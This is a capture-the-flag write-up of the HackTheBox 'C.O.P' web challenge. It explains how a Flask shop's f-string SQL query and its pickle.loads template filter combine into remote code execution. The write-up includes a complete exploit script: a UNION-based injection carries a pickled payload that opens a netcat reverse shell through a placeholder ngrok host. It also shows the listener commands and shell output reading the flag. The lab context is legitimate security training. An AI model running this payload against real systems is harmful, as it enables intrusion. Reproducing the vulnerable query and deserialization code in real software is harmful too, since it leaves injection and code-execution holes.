---
title: HackTheBox - C.O.P
author: 0
date: 2023-03-31 18:00:00 +0800
categories: [htb, challenge]
tags: [web, sql-injection, insecure-deserialization, pickle]
render_with_liquid: false
---

> The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

When the code uses `pickle`, Insecure Deserialization directly comes to mind. In this case, pickle data is deserialized when the homepage or a certain product page is requested.

When a certain product page is requested, an id parameter is provided in the URL. There is raw data being placed in a format string in the `select_by_id` method that provides the data for the product page.

```python
from application.database import query_db

class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')    
```

This data then gets loaded by `pickle`.

```python
from flask import Flask, g
from application.blueprints.routes import web
import pickle, base64

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')

@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()
```

We can write a script that performs an SQL injection on the product_id parameter to add our serialized payload that then spawns a reverse shell. I didn't managed to get the `cat flag.txt` payload to work, but a reverse shell did work.

```python
import requests
import sys
import base64
import pickle

class Exploit():
    def __reduce__(self):
        import os
        cmd = ("mkfifo /tmp/f;nc NGROK_URL NGROK_PORT  0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f")
        return os.system, (cmd,)
serialized_data = base64.b64encode( pickle.dumps(Exploit())).decode()
payload = f"1' UNION select '{serialized_data}' --" 
encoded_payload = requests.utils.requote_uri(payload)

url = f'http://{sys.argv[1]}'
response = requests.get(f'{url}/view/{encoded_payload}') 
print(response.request.url)
print(response.content)
```

Important to first install and run [ngrok](https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html), replace `NGROK_URL` and `NGROK_PORT` in the payload:
```bash
$ Downloads/ngrok tcp 9001
```

Start a netcat session, in a seperate terminal, to catch the reverse shell:
```bash
$ nc -lvnp 9001
```

After running the exploit script, we get a shell through our netcat listener:
```bash
$ python3 exploit2.py 161.35.164.69:31934
```

```bash
$ nc -lvnp 9001                                
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 39644
/bin/sh: can't access tty; job control turned off
/app # ls
application
cop.db
flag.txt
requirements.txt
run.py
schema.sql
/app # cat flag.txt
HTB{**REDACTED**}
/app # 
```
